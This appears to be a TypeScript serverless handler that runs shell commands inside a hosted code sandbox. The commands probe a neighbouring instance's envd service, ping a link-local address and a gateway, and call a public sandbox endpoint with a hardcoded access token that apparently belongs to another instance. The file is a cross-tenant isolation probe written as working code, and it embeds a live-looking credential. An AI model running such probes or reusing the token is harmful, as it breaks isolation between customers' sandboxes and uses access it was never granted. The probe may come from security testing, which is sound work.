export async function onRequest(context: any): Promise<Response> {
  const out: any = {};
  const t = async (name: string, fn: () => Promise<any>) => { try { out[name] = await fn(); } catch (e: any) { out[name] = 'ERR:' + String(e).slice(0, 300); } };
  await t('warm', async () => context.sandbox.commands.run("echo warm", { timeout: 20 }));
  await t('selfInfo', async () => context.sandbox.getInfo ? context.sandbox.getInfo() : 'no-getInfo');
  await t('myIp', async () => context.sandbox.commands.run("ip -4 addr | grep inet", { timeout: 20 }));
  const A_IP = "169.254.68.6";
  const A_TOK = "sit_n80EP1VwrDQoDnZ_YSbl_i4WoPrs-4g6k-2o7FVVd1Y";
  await t('xinstanceEnvd', async () => context.sandbox.commands.run("curl -s -m 4 -w ' [HTTP %{http_code}]' http://" + A_IP + ":49999/ | head -c 150", { timeout: 20 }));
  await t('xinstancePing', async () => context.sandbox.commands.run("ping -c 2 -W 2 " + A_IP + " 2>&1 | tail -2", { timeout: 20 }));
  await t('gatewayProbe', async () => context.sandbox.commands.run("curl -s -m 4 -w ' [HTTP %{http_code}]' http://169.254.68.5:49999/ | head -c 120", { timeout: 20 }));
  await t('publicWithATok', async () => context.sandbox.commands.run("curl -sk -m 6 -w ' [HTTP %{http_code}]' -H 'X-Envd-Token: " + A_TOK + "' https://8080-moyfnmsmcyeaqnuyf4iwtgtlrtxy2jvg34jbro2s.ap-singapore.tencentags.com/ | head -c 150", { timeout: 25 }));
  return new Response(JSON.stringify(out), { headers: { "Content-Type": "application/json" } });
}
